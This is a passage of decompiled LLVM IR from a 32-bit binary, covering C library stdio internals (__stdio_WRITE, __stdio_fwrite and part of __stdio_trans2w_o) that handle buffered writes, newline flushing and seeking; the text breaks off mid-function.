define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_80521e1 = load i32, i32* @edi, align 4
  %v0_80521e3 = load i32, i32* @ebx, align 4
  %v15_80521e4 = ptrtoint i32* %stack_var_-28 to i32
  %v4_80521e7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80521e7, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80521f34 = icmp eq i32 %arg3, 0
  store i1 %v1_80521f34, i1* %zf.global-to-local, align 1
  br i1 %v1_80521f34, label %dec_label_pc_8052254, label %dec_label_pc_80521f8.lr.ph

dec_label_pc_80521f8.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80521f8

dec_label_pc_80521f8:                             ; preds = %dec_label_pc_8052214.dec_label_pc_80521f8_crit_edge, %dec_label_pc_80521f8.lr.ph
  %v0_8052205 = phi i32 [ %v4_80521e7, %dec_label_pc_80521f8.lr.ph ], [ %v0_8052205.pre, %dec_label_pc_8052214.dec_label_pc_80521f8_crit_edge ]
  %v0_8052204 = phi i32 [ %arg2, %dec_label_pc_80521f8.lr.ph ], [ %v2_8052216, %dec_label_pc_8052214.dec_label_pc_80521f8_crit_edge ]
  %v0_8052200.in = phi i32 [ %arg3, %dec_label_pc_80521f8.lr.ph ], [ %v2_8052214, %dec_label_pc_8052214.dec_label_pc_80521f8_crit_edge ]
  %v4_8052200 = phi i32 [ %arg3, %dec_label_pc_80521f8.lr.ph ], [ %v2_8052214, %dec_label_pc_8052214.dec_label_pc_80521f8_crit_edge ]
  %v0_8052200 = icmp slt i32 %v0_8052200.in, 0
  store i32 %v4_8052200, i32* %esi.global-to-local, align 4
  %v2_8052200 = icmp eq i1 %v0_8052200, false
  %v5_8052200 = select i1 %v2_8052200, i32 %v4_8052200, i32 2147483647
  store i32 %v5_8052200, i32* %eax.global-to-local, align 4
  %v1_8052205 = add i32 %v0_8052205, 4
  %v2_8052205 = inttoptr i32 %v1_8052205 to i32*
  %v3_8052205 = load i32, i32* %v2_8052205, align 4
  %tmp36 = inttoptr i32 %v0_8052204 to i32*
  %v5_8052208 = call i32 @__libc_write(i32 %v3_8052205, i32* %tmp36, i32 %v5_8052200)
  store i32 %v5_8052208, i32* %eax.global-to-local, align 4
  %v1_8052210 = icmp eq i32 %v5_8052208, 0
  store i1 %v1_8052210, i1* %zf.global-to-local, align 1
  %v2_8052210 = icmp slt i32 %v5_8052208, 0
  br i1 %v2_8052210, label %dec_label_pc_805221a, label %dec_label_pc_8052214

dec_label_pc_8052214:                             ; preds = %dec_label_pc_80521f8
  %v0_8052214 = load i32, i32* @ebx, align 4
  %v2_8052214 = sub i32 %v0_8052214, %v5_8052208
  %v12_8052214 = icmp eq i32 %v2_8052214, 0
  store i32 %v2_8052214, i32* @ebx, align 4
  %v0_8052216 = load i32, i32* @edi, align 4
  %v2_8052216 = add i32 %v0_8052216, %v5_8052208
  store i32 %v2_8052216, i32* @edi, align 4
  store i1 %v12_8052214, i1* %zf.global-to-local, align 1
  br i1 %v12_8052214, label %dec_label_pc_8052254, label %dec_label_pc_8052214.dec_label_pc_80521f8_crit_edge

dec_label_pc_8052214.dec_label_pc_80521f8_crit_edge: ; preds = %dec_label_pc_8052214
  %v0_8052205.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80521f8

dec_label_pc_805221a:                             ; preds = %dec_label_pc_80521f8
  %v0_805221a = load i32, i32* %ebp.global-to-local, align 4
  %v1_805221a = inttoptr i32 %v0_805221a to i32*
  %v2_805221a = load i32, i32* %v1_805221a, align 4
  store i32 %v2_805221a, i32* %eax.global-to-local, align 4
  %v1_805221d = add i32 %v0_805221a, 8
  %v2_805221d = inttoptr i32 %v1_805221d to i32*
  %v3_805221d = load i32, i32* %v2_805221d, align 4
  store i32 %v3_805221d, i32* @edx, align 4
  %v1_8052220 = or i32 %v2_805221a, 8
  store i32 %v1_8052220, i32* %eax.global-to-local, align 4
  %v1_8052223 = trunc i32 %v1_8052220 to i16
  %v3_8052223 = inttoptr i32 %v0_805221a to i16*
  store i16 %v1_8052223, i16* %v3_8052223, align 2
  %v0_8052227 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052227 = add i32 %v0_8052227, 12
  %v2_8052227 = inttoptr i32 %v1_8052227 to i32*
  %v3_8052227 = load i32, i32* %v2_8052227, align 4
  %v1_805222a = load i32, i32* @edx, align 4
  %v2_805222a = sub i32 %v3_8052227, %v1_805222a
  %v12_805222a = icmp eq i32 %v2_805222a, 0
  store i1 %v12_805222a, i1* %zf.global-to-local, align 1
  store i32 %v2_805222a, i32* %eax.global-to-local, align 4
  %v4_8052250.pre = load i32, i32* @ebx, align 4
  br i1 %v12_805222a, label %dec_label_pc_8052250, label %dec_label_pc_805222e

dec_label_pc_805222e:                             ; preds = %dec_label_pc_805221a
  %v12_805222e = icmp eq i32 %v2_805222a, %v4_8052250.pre
  store i1 %v12_805222e, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_805222a, %v4_8052250.pre
  %v3_8052230 = load i32, i32* %esi.global-to-local, align 4
  %v5_8052230 = select i1 %tmp, i32 %v2_805222a, i32 %v3_8052230
  store i32 %v5_8052230, i32* %esi.global-to-local, align 4
  %v0_8052233.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052233

dec_label_pc_8052233:                             ; preds = %dec_label_pc_8052245, %dec_label_pc_805222e
  %v2_8052237 = phi i32 [ %v1_8052241, %dec_label_pc_8052245 ], [ %v1_805222a, %dec_label_pc_805222e ]
  %v4_8052233 = phi i32 [ %v4_8052233.pre, %dec_label_pc_8052245 ], [ %v2_805222a, %dec_label_pc_805222e ]
  %v0_8052233 = phi i32 [ %v1_8052245, %dec_label_pc_8052245 ], [ %v0_8052233.pre, %dec_label_pc_805222e ]
  %v1_8052233 = inttoptr i32 %v0_8052233 to i8*
  %v2_8052233 = load i8, i8* %v1_8052233, align 1
  %v3_8052233 = zext i8 %v2_8052233 to i32
  %v5_8052233 = and i32 %v4_8052233, -256
  %v6_8052233 = or i32 %v3_8052233, %v5_8052233
  store i32 %v6_8052233, i32* %eax.global-to-local, align 4
  %v10_8052235 = icmp eq i8 %v2_8052233, 10
  store i1 %v10_8052235, i1* %zf.global-to-local, align 1
  %v3_8052237 = inttoptr i32 %v2_8052237 to i8*
  store i8 %v2_8052233, i8* %v3_8052237, align 1
  %v0_8052239 = load i1, i1* %zf.global-to-local, align 1
  %v1_8052239 = icmp eq i1 %v0_8052239, false
  br i1 %v1_8052239, label %dec_label_pc_8052241, label %dec_label_pc_805223b

dec_label_pc_805223b:                             ; preds = %dec_label_pc_8052233
  %v0_805223b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805223b = add i32 %v0_805223b, 1
  %v2_805223b = inttoptr i32 %v1_805223b to i8*
  %v3_805223b = load i8, i8* %v2_805223b, align 1
  %v4_805223b = urem i8 %v3_805223b, 2
  %v5_805223b = icmp eq i8 %v4_805223b, 0
  store i1 %v5_805223b, i1* %zf.global-to-local, align 1
  %v1_805223f = icmp eq i1 %v5_805223b, false
  br i1 %v1_805223f, label %dec_label_pc_805223b.dec_label_pc_8052248_crit_edge, label %dec_label_pc_8052241

dec_label_pc_805223b.dec_label_pc_8052248_crit_edge: ; preds = %dec_label_pc_805223b
  %v0_8052248.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052248

dec_label_pc_8052241:                             ; preds = %dec_label_pc_805223b, %dec_label_pc_8052233
  %v0_8052241 = load i32, i32* @edx, align 4
  %v1_8052241 = add i32 %v0_8052241, 1
  store i32 %v1_8052241, i32* @edx, align 4
  %v0_8052242 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052242 = add i32 %v0_8052242, -1
  %v8_8052242 = icmp eq i32 %v1_8052242, 0
  store i1 %v8_8052242, i1* %zf.global-to-local, align 1
  store i32 %v1_8052242, i32* %esi.global-to-local, align 4
  br i1 %v8_8052242, label %dec_label_pc_8052241.dec_label_pc_8052248_crit_edge, label %dec_label_pc_8052245

dec_label_pc_8052241.dec_label_pc_8052248_crit_edge: ; preds = %dec_label_pc_8052241
  %v1_8052248.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052248

dec_label_pc_8052245:                             ; preds = %dec_label_pc_8052241
  %v0_8052245 = load i32, i32* @edi, align 4
  %v1_8052245 = add i32 %v0_8052245, 1
  %v8_8052245 = icmp eq i32 %v1_8052245, 0
  store i1 %v8_8052245, i1* %zf.global-to-local, align 1
  store i32 %v1_8052245, i32* @edi, align 4
  %v4_8052233.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052233

dec_label_pc_8052248:                             ; preds = %dec_label_pc_8052241.dec_label_pc_8052248_crit_edge, %dec_label_pc_805223b.dec_label_pc_8052248_crit_edge
  %v1_8052248 = phi i32 [ %v0_805223b, %dec_label_pc_805223b.dec_label_pc_8052248_crit_edge ], [ %v1_8052248.pre, %dec_label_pc_8052241.dec_label_pc_8052248_crit_edge ]
  %v0_8052248 = phi i32 [ %v0_8052248.pre, %dec_label_pc_805223b.dec_label_pc_8052248_crit_edge ], [ %v1_8052241, %dec_label_pc_8052241.dec_label_pc_8052248_crit_edge ]
  %v2_8052248 = add i32 %v1_8052248, 16
  %v3_8052248 = inttoptr i32 %v2_8052248 to i32*
  store i32 %v0_8052248, i32* %v3_8052248, align 4
  %v0_805224b = load i32, i32* @edx, align 4
  %v1_805224b = load i32, i32* %ebp.global-to-local, align 4
  %v2_805224b = add i32 %v1_805224b, 8
  %v3_805224b = inttoptr i32 %v2_805224b to i32*
  %v4_805224b = load i32, i32* %v3_805224b, align 4
  %v5_805224b = sub i32 %v0_805224b, %v4_805224b
  store i32 %v5_805224b, i32* @edx, align 4
  %v0_805224e = load i32, i32* @ebx, align 4
  %v2_805224e = sub i32 %v0_805224e, %v5_805224b
  %v12_805224e = icmp eq i32 %v2_805224e, 0
  store i1 %v12_805224e, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8052250

dec_label_pc_8052250:                             ; preds = %dec_label_pc_805221a, %dec_label_pc_8052248
  %v4_8052250 = phi i32 [ %v2_805224e, %dec_label_pc_8052248 ], [ %v4_8052250.pre, %dec_label_pc_805221a ]
  %v5_8052250 = sub i32 %arg3, %v4_8052250
  %v15_8052250 = icmp eq i32 %v5_8052250, 0
  store i1 %v15_8052250, i1* %zf.global-to-local, align 1
  %v0_8052258.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052254

dec_label_pc_8052254:                             ; preds = %dec_label_pc_8052214, %entry, %dec_label_pc_8052250
  %v0_8052258 = phi i32 [ %v0_8052258.pre, %dec_label_pc_8052250 ], [ %v15_80521e4, %entry ], [ %v15_80521e4, %dec_label_pc_8052214 ]
  %stack_var_12.0 = phi i32 [ %v5_8052250, %dec_label_pc_8052250 ], [ 0, %entry ], [ %arg3, %dec_label_pc_8052214 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8052258 = icmp eq i32 %v0_8052258, -12
  store i1 %v9_8052258, i1* %zf.global-to-local, align 1
  store i32 %v0_80521e3, i32* @ebx, align 4
  store i32 %v0_80521e1, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8052245, { 1, 2, 0 }
  uselistorder i32 %v1_8052242, { 1, 0 }
  uselistorder i32 %v1_8052241, { 0, 2, 1 }
  uselistorder i8 %v2_8052233, { 1, 0, 2 }
  uselistorder i32 %v4_8052250.pre, { 2, 0, 1 }
  uselistorder i32 %v2_805222a, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_8052216, { 1, 0 }
  uselistorder i32 %v2_8052214, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8052208, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 4, 5, 0, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_8052254, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052250, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052260 = load i32, i32* @ebp, align 4
  %v0_8052261 = load i32, i32* @edi, align 4
  %v0_8052262 = load i32, i32* @esi, align 4
  %v0_8052263 = load i32, i32* @ebx, align 4
  store i32 %v0_8052263, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8052273 = add i32 %arg3, 1
  %v2_8052273 = inttoptr i32 %v1_8052273 to i8*
  %v3_8052273 = load i8, i8* %v2_8052273, align 1
  %v4_8052273 = and i8 %v3_8052273, 2
  %v5_8052273 = icmp eq i8 %v4_8052273, 0
  %v1_8052277 = icmp eq i1 %v5_8052273, false
  br i1 %v1_8052277, label %dec_label_pc_8052328, label %dec_label_pc_805227d

dec_label_pc_805227d:                             ; preds = %entry
  %v1_805227d = add i32 %arg3, 4
  %v2_805227d = inttoptr i32 %v1_805227d to i32*
  %v3_805227d = load i32, i32* %v2_805227d, align 4
  %v13_805227d = icmp eq i32 %v3_805227d, -2
  %v1_8052281 = add i32 %arg3, 16
  %v2_8052281 = inttoptr i32 %v1_8052281 to i32*
  %v3_8052281 = load i32, i32* %v2_8052281, align 4
  store i32 %v3_8052281, i32* @edx, align 4
  %v1_8052284 = add i32 %arg3, 12
  %v2_8052284 = inttoptr i32 %v1_8052284 to i32*
  %v3_8052284 = load i32, i32* %v2_8052284, align 4
  store i32 %v3_8052284, i32* %eax.global-to-local, align 4
  %v1_8052287 = icmp eq i1 %v13_805227d, false
  %v2_80522a6 = sub i32 %v3_8052284, %v3_8052281
  br i1 %v1_8052287, label %dec_label_pc_80522a6, label %dec_label_pc_8052289

dec_label_pc_8052289:                             ; preds = %dec_label_pc_805227d
  %tmp = icmp uge i32 %v2_80522a6, %arg2
  %v5_8052290 = select i1 %tmp, i32 %arg2, i32 %v2_80522a6
  store i32 %v5_8052290, i32* %ebx.global-to-local, align 4
  %v3_8052296 = inttoptr i32 %v3_8052281 to i16*
  %v4_8052296 = call i32 @memcpy(i16* %v3_8052296, i32 %v5_8052290, i32 %v3_8052284)
  store i32 %v4_8052296, i32* %eax.global-to-local, align 4
  %v0_805229e = load i32, i32* @esi, align 4
  %v1_805229e = add i32 %v0_805229e, 16
  %v2_805229e = inttoptr i32 %v1_805229e to i32*
  %v3_805229e = load i32, i32* %v2_805229e, align 4
  %v4_805229e = load i32, i32* %ebx.global-to-local, align 4
  %v5_805229e = add i32 %v4_805229e, %v3_805229e
  store i32 %v5_805229e, i32* %v2_805229e, align 4
  br label %dec_label_pc_8052340

dec_label_pc_80522a6:                             ; preds = %dec_label_pc_805227d
  store i32 %v2_80522a6, i32* %eax.global-to-local, align 4
  %v6_80522aa = icmp ult i32 %v2_80522a6, %arg2
  br i1 %v6_80522aa, label %dec_label_pc_805230f, label %dec_label_pc_80522ac

dec_label_pc_80522ac:                             ; preds = %dec_label_pc_80522a6
  %v0_80522ac = load i32, i32* @ecx, align 4
  %v3_80522b0 = inttoptr i32 %v3_8052281 to i16*
  %v4_80522b0 = call i32 @memcpy(i16* %v3_80522b0, i32 %arg2, i32 %v0_80522ac)
  store i32 %v4_80522b0, i32* %eax.global-to-local, align 4
  %v0_80522b8 = load i32, i32* @esi, align 4
  %v1_80522b8 = add i32 %v0_80522b8, 16
  %v2_80522b8 = inttoptr i32 %v1_80522b8 to i32*
  %v3_80522b8 = load i32, i32* %v2_80522b8, align 4
  %v4_80522b8 = load i32, i32* @edi, align 4
  %v5_80522b8 = add i32 %v4_80522b8, %v3_80522b8
  store i32 %v5_80522b8, i32* %v2_80522b8, align 4
  %v0_80522bb = load i32, i32* @esi, align 4
  %v1_80522bb = add i32 %v0_80522bb, 1
  %v2_80522bb = inttoptr i32 %v1_80522bb to i8*
  %v3_80522bb = load i8, i8* %v2_80522bb, align 1
  %v4_80522bb = urem i8 %v3_80522bb, 2
  %v5_80522bb = icmp eq i8 %v4_80522bb, 0
  br i1 %v5_80522bb, label %dec_label_pc_8052340, label %dec_label_pc_80522c1

dec_label_pc_80522c1:                             ; preds = %dec_label_pc_80522ac
  %v0_80522c1 = load i32, i32* @edx, align 4
  %v0_80522c2 = load i32, i32* @edi, align 4
  %v4_80522c6 = call i32 @memrchr(i8 10, i32 %v0_80522c2, i32 %v0_80522c1)
  store i32 %v4_80522c6, i32* %eax.global-to-local, align 4
  %v1_80522ce = icmp eq i32 %v4_80522c6, 0
  br i1 %v1_80522ce, label %dec_label_pc_8052340, label %dec_label_pc_80522d2

dec_label_pc_80522d2:                             ; preds = %dec_label_pc_80522c1
  %v0_80522d5 = load i32, i32* @esi, align 4
  %v1_80522d6 = call i32 @__stdio_wcommit(i32 %v0_80522d5)
  store i32 %v1_80522d6, i32* %eax.global-to-local, align 4
  %v1_80522de = icmp eq i32 %v1_80522d6, 0
  br i1 %v1_80522de, label %dec_label_pc_8052340, label %dec_label_pc_80522e2

dec_label_pc_80522e2:                             ; preds = %dec_label_pc_80522d2
  %v0_80522e2 = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_80522e2, %v1_80522d6
  %v5_80522e6 = select i1 %tmp20, i32 %v0_80522e2, i32 %v1_80522d6
  store i32 %v5_80522e6, i32* %ebx.global-to-local, align 4
  %v2_80522eb = sub i32 %v0_80522e2, %v5_80522e6
  store i32 %v2_80522eb, i32* %eax.global-to-local, align 4
  %v0_80522ed = load i32, i32* @ebp, align 4
  %v2_80522ed = add i32 %v0_80522ed, %v2_80522eb
  store i32 %v2_80522ed, i32* %ebp.global-to-local, align 4
  %v4_80522f4 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_80522e6, i32 %v2_80522eb)
  store i32 %v4_80522f4, i32* %eax.global-to-local, align 4
  %v1_80522fc = icmp eq i32 %v4_80522f4, 0
  store i32 %v4_80522f4, i32* @edx, align 4
  br i1 %v1_80522fc, label %dec_label_pc_8052340, label %dec_label_pc_8052302

dec_label_pc_8052302:                             ; preds = %dec_label_pc_80522e2
  %v0_8052302 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052302 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052302 = sub i32 %v0_8052302, %v4_80522f4
  %v2_8052306 = add i32 %v2_8052302, %v1_8052302
  store i32 %v2_8052306, i32* %eax.global-to-local, align 4
  %v0_8052308 = load i32, i32* @esi, align 4
  %v1_8052308 = add i32 %v0_8052308, 16
  %v2_8052308 = inttoptr i32 %v1_8052308 to i32*
  %v3_8052308 = load i32, i32* %v2_8052308, align 4
  %v5_8052308 = sub i32 %v3_8052308, %v2_8052306
  store i32 %v5_8052308, i32* %v2_8052308, align 4
  %v0_805230b = load i32, i32* @edi, align 4
  %v1_805230b = load i32, i32* %eax.global-to-local, align 4
  %v2_805230b = sub i32 %v0_805230b, %v1_805230b
  store i32 %v2_805230b, i32* @edi, align 4
  br label %dec_label_pc_8052340

dec_label_pc_805230f:                             ; preds = %dec_label_pc_80522a6
  %v2_805230f = add i32 %arg3, 8
  %v3_805230f = inttoptr i32 %v2_805230f to i32*
  %v4_805230f = load i32, i32* %v3_805230f, align 4
  %v15_805230f = icmp eq i32 %v3_8052281, %v4_805230f
  br i1 %v15_805230f, label %dec_label_pc_8052328, label %dec_label_pc_8052314

dec_label_pc_8052314:                             ; preds = %dec_label_pc_805230f
  %v1_8052318 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8052318, i32* %eax.global-to-local, align 4
  %v1_8052320 = icmp eq i32 %v1_8052318, 0
  br i1 %v1_8052320, label %dec_label_pc_8052314.dec_label_pc_8052328_crit_edge, label %dec_label_pc_8052324

dec_label_pc_8052314.dec_label_pc_8052328_crit_edge: ; preds = %dec_label_pc_8052314
  %v0_8052328.pre = load i32, i32* @edi, align 4
  %v0_8052330.pre = load i32, i32* @esi, align 4
  %v2_8052337.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052328

dec_label_pc_8052324:                             ; preds = %dec_label_pc_8052314
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8052340

dec_label_pc_8052328:                             ; preds = %dec_label_pc_8052314.dec_label_pc_8052328_crit_edge, %dec_label_pc_805230f, %entry
  %v2_8052337 = phi i32 [ %v2_8052337.pre, %dec_label_pc_8052314.dec_label_pc_8052328_crit_edge ], [ %v0_8052263, %dec_label_pc_805230f ], [ %v0_8052263, %entry ]
  %v0_8052330 = phi i32 [ %v0_8052330.pre, %dec_label_pc_8052314.dec_label_pc_8052328_crit_edge ], [ %arg3, %dec_label_pc_805230f ], [ %arg3, %entry ]
  %v0_8052328 = phi i32 [ %v0_8052328.pre, %dec_label_pc_8052314.dec_label_pc_8052328_crit_edge ], [ %arg2, %dec_label_pc_805230f ], [ %arg2, %entry ]
  store i32 %v2_8052337, i32* @ebx, align 4
  store i32 %v0_8052261, i32* @edi, align 4
  %v4_805233b = inttoptr i32 %v0_8052330 to i16*
  %v5_805233b = call i32 @__stdio_WRITE(i16* %v4_805233b, i32 %v0_8052328, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805233b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052340

dec_label_pc_8052340:                             ; preds = %dec_label_pc_80522e2, %dec_label_pc_80522d2, %dec_label_pc_80522c1, %dec_label_pc_80522ac, %dec_label_pc_8052324, %dec_label_pc_8052302, %dec_label_pc_8052289, %dec_label_pc_8052328
  %v0_8052343 = load i32, i32* @edi, align 4
  store i32 %v0_8052343, i32* %eax.global-to-local, align 4
  %v2_8052345 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052345, i32* @ebx, align 4
  store i32 %v0_8052262, i32* @esi, align 4
  store i32 %v0_8052261, i32* @edi, align 4
  store i32 %v0_8052260, i32* @ebp, align 4
  ret i32 %v0_8052343

; uselistorder directives
  uselistorder i32 %v2_8052306, { 1, 0 }
  uselistorder i32 %v0_80522e2, { 2, 1, 0 }
  uselistorder i32 %v1_80522d6, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80522a6, { 2, 3, 1, 0 }
  uselistorder i32 %v3_8052281, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_8052261, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8052340, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805234c = load i32, i32* @ebx, align 4
  %v4_8052350 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052350, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8052358 = load i16, i16* %arg1, align 2
  %v3_8052358 = zext i16 %v2_8052358 to i32
  store i32 %v3_8052358, i32* %eax.global-to-local, align 4
  %v2_805235b = and i32 %v3_8052358, %arg2
  %v3_805235b = icmp eq i32 %v2_805235b, 0
  %v1_805235d = icmp eq i1 %v3_805235b, false
  br i1 %v1_805235d, label %dec_label_pc_805236b, label %dec_label_pc_805235f

dec_label_pc_805235f:                             ; preds = %entry
  %v1_805235f = and i32 %v3_8052358, 2176
  %v2_805235f = icmp eq i32 %v1_805235f, 0
  %v1_8052364 = icmp eq i1 %v2_805235f, false
  br i1 %v1_8052364, label %dec_label_pc_8052373, label %dec_label_pc_8052366

dec_label_pc_8052366:                             ; preds = %dec_label_pc_805235f
  %v2_8052366 = or i32 %v3_8052358, %arg2
  store i32 %v2_8052366, i32* %eax.global-to-local, align 4
  %v1_8052368 = trunc i32 %v2_8052366 to i16
  store i16 %v1_8052368, i16* %arg1, align 2
  %v0_805236b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805236b

dec_label_pc_805236b:                             ; preds = %entry, %dec_label_pc_8052366
  %v0_80523b4 = phi i32 [ %v4_8052350, %entry ], [ %v0_805236b.pre, %dec_label_pc_8052366 ]
  %v1_805236b = inttoptr i32 %v0_80523b4 to i16*
  %v2_805236b = load i16, i16* %v1_805236b, align 2
  %v3_805236b = zext i16 %v2_805236b to i32
  store i32 %v3_805236b, i32* %edx.global-to-local, align 4
  %v2_805236e = and i16 %v2_805236b, 32
  %v3_805236e = icmp eq i16 %v2_805236e, 0
  br i1 %v3_805236e, label %dec_label_pc_805238b, label %dec_label_pc_8052373

dec_label_pc_8052373:                             ; preds = %dec_label_pc_805236b, %dec_label_pc_805235f
  %v1_8052373 = call i32 @__errno_location(i32 %v0_805234c)
  store i32 %v1_8052373, i32* %eax.global-to-local, align 4
  %v1_8052378 = inttoptr i32 %v1_8052373 to i32*
  store i32 9, i32* %v1_8052378, align 4
  br label %dec_label_pc_805237e

dec_label_pc_805237e:                             ; preds = %dec_label_pc_80523a2, %dec_label_pc_8052373
  %v0_805237e = load i32, i32* @ebx, align 4
  %v1_805237e = inttoptr i32 %v0_805237e to i32*
  %v2_805237e = load i32, i32* %v1_805237e, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8052383 = or i32 %v2_805237e, 8
  store i32 %v1_8052383, i32* %eax.global-to-local, align 4
  %v1_8052386 = trunc i32 %v1_8052383 to i16
  %v3_8052386 = inttoptr i32 %v0_805237e to i16*
  store i16 %v1_8052386, i16* %v3_8052386, align 2
  br label %dec_label_pc_80523ed

dec_label_pc_805238b:                             ; preds = %dec_label_pc_805236b
  %v2_805238b = urem i16 %v2_805236b, 4
  %v3_805238b = icmp eq i16 %v2_805238b, 0
  br i1 %v3_805238b, label %dec_label_pc_80523d5, label %dec_label_pc_8052390

dec_label_pc_8052390:                             ; preds = %dec_label_pc_805238b
  %v2_8052390 = and i32 %v3_805236b, 4
  %v3_8052390 = icmp eq i32 %v2_8052390, 0
  %v1_8052393 = icmp eq i1 %v3_8052390, false
  br i1 %v1_8052393, label %dec_label_pc_80523c1, label %dec_label_pc_8052395

dec_label_pc_8052395:                             ; preds = %dec_label_pc_8052390
  %v1_8052395 = add i32 %v0_80523b4, 20
  %v2_8052395 = inttoptr i32 %v1_8052395 to i32*
  %v3_8052395 = load i32, i32* %v2_8052395, align 4
  store i32 %v3_8052395, i32* %eax.global-to-local, align 4
  %v2_8052398 = add i32 %v0_80523b4, 16
  %v3_8052398 = inttoptr i32 %v2_8052398 to i32*
  %v4_8052398 = load i32, i32* %v3_8052398, align 4
  %v15_8052398 = icmp eq i32 %v3_8052395, %v4_8052398
  %v1_805239b = icmp eq i1 %v15_8052398, false
  br i1 %v1_805239b, label %dec_label_pc_80523a2, label %dec_label_pc_805239d

dec_label_pc_805239d:                             ; preds = %dec_label_pc_8052395
  %v2_805239d = and i32 %v3_805236b, 2
  %v3_805239d = icmp eq i32 %v2_805239d, 0
  br i1 %v3_805239d, label %dec_label_pc_80523c1, label %dec_label_pc_80523a2

dec_label_pc_80523a2:                             ; preds = %dec_label_pc_805239d, %dec_label_pc_8052395
  %v1_80523a2 = and i32 %v3_805236b, 1024
  store i32 %v1_80523a2, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_80523a2, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_80523b5 = call i32 @__GI_fseek(i32 %v0_80523b4, i32 0, i32 %tmp17, i32 %v1_80523a2)
  store i32 %v5_80523b5, i32* %eax.global-to-local, align 4
  %v1_80523bd = icmp eq i32 %v5_80523b5, 0
  %v1_80523bf = icmp eq i1 %v1_80523bd, false
  br i1 %v1_80523bf, label %dec_label_pc_805237e, label %dec_label_pc_80523a2.dec_label_pc_80523c1_crit_edge

dec_label_pc_80523a2.dec_label_pc_80523c1_crit_edge: ; preds = %dec_label_pc_80523a2
  %v0_80523c1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80523c1

dec_label_pc_80523c1:                             ; preds = %dec_label_pc_80523a2.dec_label_pc_80523c1_crit_edge, %dec_label_pc_805239d, %dec_label_pc_8052390
  %v2_80523c6 = phi i32 [ %v0_80523c1.pre, %dec_label_pc_80523a2.dec_label_pc_80523c1_crit_edge ], [ %v0_80523b4, %dec_label_pc_805239d ], [ %v0_80523b4, %dec_label_pc_8052390 ]
  %v1_80523c1 = inttoptr i32 %v2_80523c6 to i32*
  %v2_80523c1 = load i32, i32* %v1_80523c1, align 4
